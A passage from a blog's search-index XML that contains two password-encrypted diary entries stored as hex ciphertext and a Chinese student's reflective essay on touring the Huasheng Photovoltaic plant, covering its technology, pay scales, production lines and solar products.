721fd8245f29a169694c10e46bfb7736d0968da9a711f53a62d84503fcdc7fa2e5330fc143450bce82c777a85eef91df5241b543d1b295fb10c5bc158d803580b1010c55f5ac100c6970226d0c768266997c700241c208c63cbae3a2a0d36b74d71df0c0c7c1d7b496921c92c61e8088f9a279e1edc64f2978a552a95624a7e5f3d334d38d8b230700618875f9814f902e13565fbd704f57abc3b73e312ede87a43e0f315e92d79eb837721bb62362ac2792ecc3521f456567bd9f1f413bf51f8e7431281814c494eda1647053fa20987d509077a6a37e8b8e8430b9cbb28f74b9b5404bb73001571791de4007ff567ddb70e20308dc28a606b797cf955509aabeef4afa3fa203f66d4b9e22cd7251d876e53e4ff7fba48907e3711578cfe58f5eeff3ddc01d800b37ab4a408c1a8fd3ead500153b578fd3c1062c1fb837e1cc37ad73e2979db98ce61b62d6d518b674ad6345e38f2802c870e913e9d97e0e1d3e815b80db0ffeef40356026105f79125e5656398ed6b4379b6ceb29dd76e2fc56240e6a2ef318940b928d5c366428f6bf41cb842519b827b7774ded5ab31f8d5f062a5335211869bd1ce83185fc7475a6ca9210972fd154675553673ce2a7b51c2403034731030ec99b61ae4628def5e0184c19f24d4218f62ad618675fd657b3f53711fce00624fe57dca83058315a6ecf90c6da5f5a105dd479518f4ed98dd0fd03f37b9c5041567e0428a96c26c5f4a29ba6f2627ca2cb7536018da9af43b41904a2a22f30ae0c62535b12eceebd766dc3956210fb9bb4e824928eede96116a0c39dc1074472e429794dded5cd295be5e32e4a440e52f1399c2fc39cc937564bf3ab996d2255c0fe26c1a70964bf051d9daca3a4b0dada4b477ae8e2c6de6e649ebd7dc98b2a76ab0ba1d08a394687faf2b7879a6215b4a8ad458e693c7e2e0f3344df5e1d01a417dd486ec116ea5eb00ce4c0c241e1a77085e6ec70876fd30d41e18270156345b05fb021701b9a4378f42820c54d3d10530a69cb4b5bbd75ec7cb57fd68c2422d70f169c4cbedbaba078eaeb2c2e81cedb4aea991b401b1681d29b9c32b440ec8d94a09b48a66dc565aa551b88efd45275b349700d880a9519a758152dbfdc51ffd9fc9a1256994421d1cea582cfba4e4090ebe3291e2cfbf46431619ca340924a36d137c94b8217a3f9b13bec73e243a986125c6d408248235a5500658e5c90a2bfeefef90cee17343b99241213a7438b625b7c24f3278dcbd5c7dbd9802a8577e79f4f672c4752c09e68abb04fbebbcf574dab27883b7d92caaf815671c83f89389ea498d2763d6284812abe8a0c6e2581138336e4856e136e974ac142cf13f1f421a30aaa3689632f39ebb2f04f63e38a34ae4482cdb74ec6bcaa2e885f6482b7a341ace2b77d0ffd5958c4efe07335efba311d9d058b9af7b339247e4df7f7f703d82efa0f65b12c5fcc6f736ab07e9671378d39b9f7273f4c2967af99af1951dfff6cc4118a82d124532936f5cf3b601eb0b0dcdaa67f986a968780007e0061e252c0197d3104ab042e5a9df027ccd5c075c9a363fd36af2f1bcbd9bd97dd0999e0b1df4523e2297a5d5a67308fa4d97ed00465fcee8e946a0faa693927345bd903723990a6642e42e1d43b69f75405c439865da3a2332d4e67bfde3a1af846fb942948223bde75e47d65c2875b41f1950145c8cb74a402a991b484ee5b6d31f565512f0466e65aa1a3124c9a841cc69c7c32ded0ca79777def50917021c99d223af260b2fdf201abc17be7409c2cbc108db46744b5b9e23f5b95f6154f127d8af047a7172886bb6d764cb348802425a9fd5ffa589eb919af05ec348c85d58367d9f56ac3642aa4dc01be27fde5990c349b0d99f77839b25e47cd2d4459792776ab1abff217dc27c7fe1e9a40ffb56f640666503cc7af0ba5686b61c6d630ac561e2a886f99fa29346310c4ed2f38af7551c5403e5c3398f72784d85d4ac23072af78219db0016a35aaef0e557ebdc12a854aa59199d24bc6060569a1ad1635357e121bd641c3119b0374c735087a1a3f5292d16509006c0d9244cbb95df007c07e1168cb1eadb9bb6d1d21731f68dec94fbcff3357818576d3071b1fb75a0668aa009ec1b4d9e0cd9692f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
          <category> Sensibility </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于428开盛集团旗下华晟光伏的参观与思考</title>
      <link href="2021/05/14/7Rationality3Sensibility/Rationality/%E5%85%B3%E4%BA%8E428%E5%BC%80%E7%9B%9B%E9%9B%86%E5%9B%A2%E6%97%97%E4%B8%8B%E5%8D%8E%E6%99%9F%E5%85%89%E4%BC%8F%E7%9A%84%E5%8F%82%E8%A7%82%E4%B8%8E%E6%80%9D%E8%80%83/"/>
      <url>2021/05/14/7Rationality3Sensibility/Rationality/%E5%85%B3%E4%BA%8E428%E5%BC%80%E7%9B%9B%E9%9B%86%E5%9B%A2%E6%97%97%E4%B8%8B%E5%8D%8E%E6%99%9F%E5%85%89%E4%BC%8F%E7%9A%84%E5%8F%82%E8%A7%82%E4%B8%8E%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>信息安全领域中有个术语叫做逆向，百度解释如下：逆向工程是一种产品设计技术再现过程，即对一项目标产品进行<em>逆向</em>分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能特性及技术规格等设计要素，以制作出功能相近，但又不完全一样的产品。</p><p>计算机视觉领域中有个术语叫做三维重建，其中的一种方法是通过同一物品的若干张二维图片复原出该物品所处的真实三维场景。</p><p>经过4月28日对华晟光伏的参观，我从技术路线，产品生产，人力资源，组织架构，政策，经济效益等多个角度，试图逆向并重建整个公司。根据现场所见所闻作出一定的演绎推理，考虑多因素影响，在已知最接近现实的理想假设条件下，对公司的过去进行拟合，对未来进行预测，并得出个人在发挥不同主观能动性的情况下得到的不同人生结果的预测结果。也许结论尚早，需要更多的数据，但大概率情况下：在这座城市生活，不是我喜欢的生活，在这个行业的工作，不是我向往的工作。</p><p>对于实习，以前我一直以为可有可无，那是因为我处于应用物理专业，似乎不存在实习的概念。但自从改行之后，我切身体会到了第一份工作与实习的重要意义。毫不夸张地说，一个“好”的实习，对一个大学生各方面的提升速度甚至超过大学四年的总和。至于如何定义这个“好”，那就千人前面了。</p><p>下面浅谈我这次参观学习的所见所闻，所思所想。</p><hr><h3 id="关于细节"><a href="#关于细节" class="headerlink" title="关于细节"></a>关于细节</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_172622.jpg" alt="IMG_20210428_172622"></p><p>也许，从这外表“最气派”的建筑看来，贵集团底蕴深厚，确实，作为一家国企，按理说以稳为主，方正形状，稳重但缺少活力，扎实但少了创新。关于设计，我更欣赏OMA，NBBJ。</p><p>接待会议开始，介绍企业的PPT做的都不符合基本规范，读ppt的小姐姐让我想起了一句词“大弦嘈嘈如急雨，小弦切切如私语。嘈嘈切切错杂弹，大珠小珠落玉盘。”也让我想起了曾经某人的比喻“像机关枪一样哒哒哒的，听着很累”。总而言之，诸多瑕疵体现了两个字——匆忙。显然，不会为了我们这些渺小的存在而准备完备，同时，也验证了华晟光伏刚成立不久，属于初创的事实。年轻的公司，喜忧参半。</p><p>关于公司选址，地处安徽宣城的偏远地区，当然，计划作为日后的光伏发电基地大概率是不可能放在靠近市中心位置的，这仿佛给了人一种与世隔绝的感觉。宣城不大，经济发展不能说是先进，机遇不多，也许不适合我这样喜欢挑战，喜欢机遇的年轻人吧，没错，我就是喜欢卷，喜欢安逸但不习惯安逸。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_112137.jpg" alt="IMG_20210428_112137"></p><p>午餐时与一个资深工艺工程师聊了些许，这位老师傅看起来有四五十岁了，当年毕业于南通大学物理专业，这位师傅是跳槽来的（看来跳槽加薪在这个行业里面也挺香）。资深工程师的上级就到专家CTO级别了。公司内部划分1~27级别，1级最低是保安保洁这种职业，最高级别27是CTO这种级别，像一个普通大学生进去也就7级这样，每年有机会上升1-2级，默认的话似乎最快需要10年才能到达最高级别，这还没考虑学历的情况下。。。所以这发展前途，别的行业干了10年都能赚足一辈子的钱了，实现了财富自由，而这。。。刚进去才0.5w左右一个月，税后到手也就三四千，这叫好？我不认为这是好。</p><h3 id="关于技术"><a href="#关于技术" class="headerlink" title="关于技术"></a>关于技术</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210514234502879.png" alt="image-20210514234502879"></p><p>经过介绍得知，华晟光伏最核心的技术方向优势在于日本20年专利保护期终止所解封的部分，最核心的人员在于一位CTO是中科院电工所研究员及其学生，以及未来招收的研究人员。</p><p>科学是技术之母，所以大方向上，学术和工业结合是很好的方式，这也是很多大学老师都有自己公司的原因，如果换成是我，我也会这样选择。当然，当老板也不仅仅要考虑技术这一个方面，更要考虑市场需求，风险预估，政策态度等诸多方面。</p><h3 id="关于研发"><a href="#关于研发" class="headerlink" title="关于研发"></a>关于研发</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_131700.jpg" alt="IMG_20210428_131700"></p><p>公司走的两条路线，一个是钙钛矿，一个是异质结。异质结成本高，但是效率比钙钛矿好，钙钛矿相对廉价点。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_134828.jpg" alt="IMG_20210428_134828"></p><p>技术的跃迁总是以阶段性的突破，每一代技术之间带来效率的差异能达到10%甚至以上。而如果技术上没有大的突破，将很难产生肉眼可见的实际提升，而且在工艺上也只是百分之零点几的优化。所以说，研发就是科技公司的命脉，新一代技术的产生对以旧技术为主的公司来说，简直就是降维打击的存在。</p><h3 id="关于人才"><a href="#关于人才" class="headerlink" title="关于人才"></a>关于人才</h3><p>学术界的研究成果，该公司按理说有能力掌握第一手信息，而CTO便是中科院的研究员，中国大部分的科研产出，基本来源于中科院。高校方面在这个方向的领头羊带的学生，也在贵公司的招募计划中。可以说，贵司在人力资源方面很有优势。企业的研发人员需要做的，就是从实验室到生产的部分的研发。</p><hr><h3 id="关于政策"><a href="#关于政策" class="headerlink" title="关于政策"></a>关于政策</h3><p>由于光伏产业属于清洁能源一块，为了实现2030碳顶峰，2060碳中和，用光电风电等清洁能源来代替传统的火电将会是必然趋势。政策上必然会受到政府的大力支持。要钱，会有一定的补贴，要地，给地。政策上帮助提供初期成长条件，至于结果，主要就交给市场筛选。</p><h3 id="关于生产"><a href="#关于生产" class="headerlink" title="关于生产"></a>关于生产</h3><p><video style="width:500px" src="https://www.enf.com.cn/z/v/63960223da872175.mp4"></video></p><p>此处给个官网的生产车间视频的链接<a href="https://www.enf.com.cn/z/v/63960223da872175.mp4">https://www.enf.com.cn/z/v/63960223da872175.mp4</a></p><p>看到的和这个基本是一样的，工业4.0的风格，自动化程度挺高的，由于生产的是光伏芯片，镀膜的精准度在埃单位级别，纳米尺度的产品不自动化估计也造不出来。</p><p>生产线的组装很多已经实现国产化的了，从论文到生产线，就是企业研发的事情了，从实验室转移到生产线，各种仪器设备的参数就随之设计出来了，接着交给特定的厂商定制，或者用已有的设备进行改造组装即可。</p><p>但有一个问题，在这样的企业，话语权最高的应该是高层的研发人员，比如CTO可以直接决定企业的技术路线，而这似乎是不利于新想法的产生与实践，研发是投入很多，收获不多的一种工作，所以这对公司的组织架构，企业文化，资源管理来说，如何激发创新思想，最大化将思路转化为实际就是一个巨大的考验了。作为一个科技公司，我认为最重要的是可持续的不断更新迭代的技术，这个要求是非常高的，对此，我仍然抱有怀疑态度。</p><hr><p>参观他们的生产线时，由于对生产环境有较高要求，所以需要全副武装的以减少空气尘埃。厂房新建时，油漆工不慎滴了油漆进到车间，导致车间空气中有机分子成分上升，导致产品良率下降很多。</p><p>我们一共去了2个车间，一个主要是镀膜，一个主要是用于封装，内部不让拍照，具体的就像前面视频中的那样。首先是第一个车间，整个公司的最值钱的就在这条线上了，从原料到异质结芯片。有的镀膜步骤需要特定气体环境，因此就与高压气体等有关系，所以这对安全管理也有一定的要求。车间中用的AGV智能小车，真的是再熟悉不过了，18年我们第一次参加数学建模选的题目就是它，队友用C++编程实现其自动巡航路线，解决了相关路线效率问题。接着，我们去了第二车间，这个车间主要是封装工作，将生产好的小块电池封装成一大块太阳能电池板，里面也基本都是自动化，是普通操作工人工作的地方，没有学历限制，据说年龄最小的才16岁。关于车间的流水线，不断地让我联想到数学建模的东西，全是物理数学模型烧录的代码，精准控制。所以，有学数学的机会，还是要好好学深的，用时方恨少。我看到了胶带机，自动对产品进行封装的机器，大约有大学的一个讲台大的占地面积，有2米高这样。我看到了机器臂，这让我想到了参照系，不禁开始思索如何在程序中教会这只手臂精准地把握分寸，想起特斯拉工厂的机械臂，空间站上的机械臂。特斯拉工厂的机械臂是通过学习熟练焊工的手法，记录参数进行学习，模仿而成的。似乎每种设备都有做的很好的厂家，比如深圳就有专门制作AGV小车的厂商，</p><h3 id="关于产品"><a href="#关于产品" class="headerlink" title="关于产品"></a>关于产品</h3><p>参观了他们展厅的一些产品，随便说几句。主要是光伏建材，移动能源，靶材，装备这几个方面的产品。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132642.jpg" alt="IMG_20210428_132642"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132125.jpg" alt="IMG_20210428_132125"></p><ul><li>垃圾分类，如果可以智能分类是挺好的，想要垃圾筐有智能就要有电。拖着电线不现实，所以用太阳能电池板倒是挺好。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132813.jpg" alt="IMG_20210428_132813"></p><ul><li>关于效率感觉还是很低，目前对太阳能的利用效率才达到五分之一的地步。虽然慢慢开始实用了，但还是希望效率越高越好。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132841.jpg" alt="IMG_20210428_132841"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132916.jpg" alt="IMG_20210428_132916"></p><ul><li>当井盖有了电。。。emmm，电池的防水防潮是个挑战。用处？在发电效率上来之前没想到有啥用。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132921.jpg" alt="IMG_20210428_132921"></p><ul><li>柔性光伏板，他们的柔性是把光伏电池芯片做成微米尺度的大小，从而实现可卷曲的效果，如果用这个材料做成雨伞，设计成服装，倒是挺好的，关键是人们对这种需求是否能克服其成本。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132947.jpg" alt="IMG_20210428_132947"></p><ul><li>这个产品体现了idea的价值。如果每棵树都有自主供电设备，那么至少可以实现森林健康监控，防火，保护野生动物，森林防护，都有用武之地。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_132957.jpg" alt="IMG_20210428_132957"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133012.jpg" alt="IMG_20210428_133012"></p><ul><li>我个人感觉，还是信息化带动了这项需求，如果不需要万物互联，所谓的万物也就未必需要用到电，而分布式太阳能电池板结合蓄电池将会极大方便分布式智能设备的运作。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133025.jpg" alt="IMG_20210428_133025"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133031.jpg" alt="IMG_20210428_133031"></p><ul><li>旅行套装，带着去旅行在野外充电？挺好的，就怕遇到天气不好的情况。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133141.jpg" alt="IMG_20210428_133141"></p><ul><li>电池板近照，里面是用电路串联而成，每一小块大约有一个小鼠标垫大小，若干个串接起来。每一小块都有特定的ID，便于追溯生产线上产生的问题。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133146.jpg" alt="IMG_20210428_133146"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_133153.jpg" alt="IMG_20210428_133153"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_131213.jpg" alt="IMG_20210428_131213"></p><ul><li>用作屋顶的发电砖瓦，主打轻薄，但是城市中的实用性优先，城市住宅区光照面积有限。</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_131220.jpg" alt="IMG_20210428_131220"></p><ul><li>用于充电的座椅，适用于公园，智能公交站等场景，手机可以放旁边充电，似乎是通过NFC等无线充电技术，但这似乎也有安全隐患？</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_131235.jpg" alt="IMG_20210428_131235"></p><ul><li>用于车顶的太阳能发电板</li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/IMG_20210428_131353.jpg" alt="IMG_20210428_131353"></p><ul><li>用于车棚的光照收集，但是太阳能电池板的一个重要指标是热系数，定义的是当温度每升高1摄氏度对发电的效果影响，温蒂越高，材料就越受到影响，从而降低发电效果。这就有意思了，像中国江苏一带，夏天室外温度动辄四五十度，柏油路面的温度更高，作为深色材料的光伏电池板，是否经得起高温的如此考验呢？发电效率具体又能有多少？在成本廉价的情况下能达到一般情况下实用程度吗？经得起实践考验的才是好产品，我在此仍然抱有怀疑态度。</li></ul><h3 id="关于客户"><a href="#关于客户" class="headerlink" title="关于客户"></a>关于客户</h3><p>买方与卖方永远是相对的两个概念。</p><p>在流水线上的每种设备，基本都有做的很好的厂家，对于这些厂家来说，华晟光伏就是他们的客户，比如AGV智能小车，胶带机自动封装，流水线，机械臂，当然，像荷兰光刻机这种设备肯定是属于全球限量版设备了。</p><p>对于华晟公司生产的产品，根据产品的不同可以卖给不同客户，包括C端和B端，淘宝工厂直销，代理销售，作为发电站为供电局提供输电支持，直接对别的B端供电，招标与中标等等都可以。比如某所学校要做能源改造，要用清洁能源建立自己的储电机制，这就用到了这家公司的产品。</p>]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
          <category> Rationality </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
            <tag> 光伏产业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>diary-210508</title>
      <link href="2021/05/08/diary/diary-210508/"/>
      <url>2021/05/08/diary/diary-210508/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1395d21e77ff52eb8088a56febeea9c86ee279eee409f0f87308ec9406779761">c05db5c9326e1a204d18d71a654b071fa5312b3d80e91bfb1999962a533063f24e4c006b30b3b4820eac00a02eb3faada40aa1e0e913839c37c2dc76464b7d2fc430566ac2ab00bcca2e26daaa5f35991351c6165c6836ede2ab5d98470610f74de7a93ca3ff5aaa6a2125b53fde80835de53e83ae398bb3f6555352604668d6df43fe0bfefde4de352501cdc804765018926f84804f0582348673a1c2737ab21fed0f63905905f78b341bb78b3be9a91dc6ef152cb7ec801e170cb6dd3e37b5cab8f9ee5c55c44792d5af9a9b6a1a6ff0f901505383c780a60d5e7fc683499b7142441ed7b5738420d85436464f72620f2ac68111b1e54506b0b21e02f9445922bbaa5fbec6918524a11049d0a3f429dafda86812104fab3a7acdecb07772f7bd31a6a901a5de7fd11951acc1a5e3dbef3deea4c337f5f2ed2319d436637538e58d1516038b58a2e49f0dcd462a6da26e04b6dd752a216b1eb7298df8c32576566d5e19c6307daba40e71308d21afab788ef57f44c6515bb8ad704db4205ff1ee829317f367b2ceab06075a5d56b79e10f7576e05d7a6460eed59b84901c46b5687660f0a9fa7e3bb7dc8cbe32e35c28b76483dc214a1313404c0bfbf913960af23d915aec8d570b86012f208cd6a653462f864294b31cc88db129a5257c48edce14ee55e48f5c8240af03105be7c63088d1847ee15fb1e5f9dc43859cd5ebcd06e450b8cf3807f52adbca3c01c3cb26eca994af944611a44fcd5b62deafad2a42f9a148bd99e613eed61f4dc742dccb06f97846e8c43a2d7c980c10e74b69e507995a663ed44bcf9266cc9db8d8491a625f37256d77db7f42ecaa6fad326d0a8691ae681ed1e1e4c02b7a03b79c9cc405c4bc345b2238ee36d65e3813ed8212e81fe9f01b020065ed92bdb8be02d5af73315bbda615f4869d18b78f420a6638f6784a58df17c1e2bd5d98dccdc066cbe2f38c9a5948edd4fd6a56f4be6b3cc71565f4b4b621df96b04dd53aad6ba5238f3ba41e954b657ab6ca79d2e8f256f634bee897ffc557542aec4addd59966fa3f59871cd3612ae382d2f5c417aad31ebe50a5dff15446b9ae8c76a8839044d0f31bf3817e9b999451b39803cc2cd23a8315ec5db0a6e5c0865c62704836bb5de7e3c29763c36faf4149bd3278ac9abc9e82bfe825a0401c09def5bfdbcad403416389c59ba2046a8226df133a57cf59e653c4b766cc7c3555ad1266475a789e165aa21f72be1f21db5296f6e3bc31468fee79d921c24fc2a1277472d0d19e1aca0dc3631fe7ac503bc734cfec402af008dfe309081535234117b503f097c272dd7525f42d4a0691b1bc7cefbda5da27b751adcb33a2d794a4e0b799c666a626413b559f6814437324c51399b905a8d9efcee716d8bdb75a53c0b7d2d0f0fa696db1ea94d6235297a70efd82bde9aa5156c788184998183fd1c65a512122b2ef0dc4cea285211098789994682a8a784ddedb721a37558e343d912c236f155bab07f8a188fe641a94eaeeee43b7e063f00045b0d8df58de2228640eb5c78f637b43d35e6e0c7d89d98649d2d7cf0524d5df2bb96f23f513144aac9cfa5adecebd2520623fe753b854046e083b300b54a542aee4c8cb91702c8cf651d14797865ee81fce802a155e77a0633a9b2163d7edbf1d295f41cf29928c482af7c9c4e6c867c31ccf7ff7892c90c8637e475b2bf0abbedff13d44100ec03fc3fa72d8946e8735f3d4f129f2b2d7f117727090b4bfa06add9ef7d7a2c5e3fdeb70e9cab38ed3720e22345effe7ee75ab13525d64b527bb3c1f0a1325351a5f924ce170b0e30287b1abdcdad1d06c75bedca922aa154f7ebdb870260a70082e934e958868db3865c31ba4a891549ff61b4482a4b2380296a09dc21f65159a03d14e31070d60b7f914f5a8a23c019cacb24822a8c4086de2a48d555b3bbe913e2ebe74df79bc623ad69de782d25300863c5a8a88feed25fb718c728d8164dc89a59e5a7de08ee5dacc43342f14ba0d94440bac27dd981aa96911976184e6356d8317f8e4967fe7da2940d1b9443943842346b7c320953d49320e7a2859862634973ea7061ebda243176b4029fe85b79fea03919b36c1469a332366b0cad421ebb63d1ff07de398db860ca931d0d831ffdbc328502cc8f6dcfaddb8cd1ce6ace9a2a950b011f8672daf1924e2d17103cb071031d02ce82f475ea83dbde45629dde64cb40c85e8852ce06edf137cc144992c89709adfc047d9ead31c49f1c224c784132edc6556414602bf08c4d9ed358ea1d455b75c6ea0e6e5c929d8513a798408d957ef4c1159c8ae08f863bb71393f13a9024346029d36be50f233f4960d4a2e755c288b3c98660cd83695601151d17049a2f504b1f53b5f7d8da856071db35234553cf07a4a88088be4c061f56aad9f4f5eb643154edbd1818f701634cb0db90b307db0ff3c9701600315eb604c0c75936c32b3ac236d2277fca16eb70346f1430ed21e970ebde6de5623ad2997888e68f008e575997e71162f57928438bdf2c1e362617ed6f0430e6ca51d49e13042f656d106fa6c4cc3285ccddef75bb8c489c054642b1167cdff1545a840181d68a56cf6b046fbfa940cb1fa01e9e9de89fb98b549f138389ea00f92020858c114cd75d73628f70bc237b50f00f54b20b0a06b75d8b1bb4411643a304451762a07f1421779dd7b7ab08cc66318ee8539d43a81d963248fb8eb8c820957ac0e7c8b26b945c9d9df7b4a392ee1c8e0e488e2b557f239208c7c99a61f106edc3bfea73bcfd7301ca2e7b70764e309f7448f78e64a30c416cbe324ba2dd5b10d23143c66b5737e505dc912cf733dec80ca39535b3e7ee2781fb35140004bece705c4e96b6b72871bb9bc82e21112c642ef995b28e597fa40cee1d0273fde1697e31a6b945088b1d5f6ac4c608a2ce4d22aecc46df50636590470c9b49158a1f2f7e8f451ec369543bb1118c12e71754e582c4eb3713b01abc20217a83b4187aa228d2b1e6c135f52fad1af0569541e9ee9492a24df7d0557797b40cbca1460dac9c19fc90e108eb6df451b38eb7476681d67b269e89436fa413e8b072e7b4c7352e4d8e99b83108e41fc113fa551c64808e6bea73ef38930c541ba61670cbf2df5e6356f1b6af5aa0c679daf26e5be1ba07c63971e91234bef4762d19d3b0c90401feacf5f543e5f212dbcc564afff3a7262cc74e5ddae1668bb05ad193fcf54d19b43470505997c3c134ec90b71011b1632b286a3588840604ee6b9c46a4b4ea5306050285679a8c4a1992bc772c6bebf8ecd806f4da2d238a51d3aa1b3e6cb8698aaf8ed3c42ecf1b1b7fae539bbd279ee300f813c6f3731333ca35392ec58c5d04cddbb5317f0c4b10382a8f96ef13a23658f3227d1d8b71507d4f3c14d8b67c04bc40776e3d7089b6aba866fabc06df4c2207f7b5aa727d24e740384d2562b568c5f232598a5fce6e9e5d74fb4070795c822f7d53bd7cdf8bf8a435dd453eb93c4be79cdf5b1758cd02f13f4c9633c80d657659e59682832f2b6259db641fa24001958773ce4f7610e2947b5dbe4d963a9867f08338cfbd6d64b83173706a2b9502f2ac1ddcf3977ce7ba1d26fdf7348bc97137bfb3ae2f0f5142fd1f1187c4e1763735fb2c8358082ef7aa4c32cefa7600df6209b149ff0c45e175440af17bde6adb52f9af12834496dbdead6dcde0ef4c296c8aa694f7a268768ffc633e5ca725fbda4ad7c090d1b396541c81f92891816fec9623e3e5318331ef632d7f37f42386e860c31c5386e57a6aa6f4d87f64684b505a6cc732d0d0a4d1f2713682273656d5bd979aed99205024b2d40cfc859d030ae555ac44cb062f33cc09ec3e96d3b7e62b7b7846514ed5c852fd6cb6330f979f8238f22d61a53b126473153fbdbb00f9b8e1326f743fa200552c03aa51e3bca783076ddaf318ed40987c47f9c792f6273a1bf92ddd326a7180b85155d306d7a2c28e7a7947b12f0102dde343bb4fa6405c6f050e9241c183e35efb4b9392b1e0c1d695c0c665b3844cd9f7afa91da987ce7fa5fa6ca5ead925b439ba6039c5c0342006b4a4624423c4f6fcdb04442a56f845e5c6da541be2dfef8650521f7779b45084627e91f3b47672d5d76f51e6f9ee3f8d2a00be53a2e655e9cd94ac519c5120a892a95241fab85db88601ce957ae24c21c9680fbf648e73004609ade8db6d531f5036611f9b47bad91cbc3ba158a307c97a93b22d1102af8472a5bb4ad1fdf568998fd1798a6b253eb94e12756fe16b2355b2ee68e4cde7d26d5061db83ed61e1994add9a5c7f5253d1ec7ace8ea21389c5783027858556d17ae709bd0db28e545ee34f777e778420bec6b1b66bd47fd959c35debe96a04030eedf60161af1b4fa252167faa038f5c5a9886a7c62117eb632647cd6a4e0ac2dd88a5ad28a23130bd9f7caf8dbcb98ba5a34e0370a4f0e61620d8518eb73ae635d8688c51f3a0a66d894d4383851a9e79044db80a218b10c4ace40275d555bcb4c248429d9678e1c1699f8155a5663611498e896d73e4</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
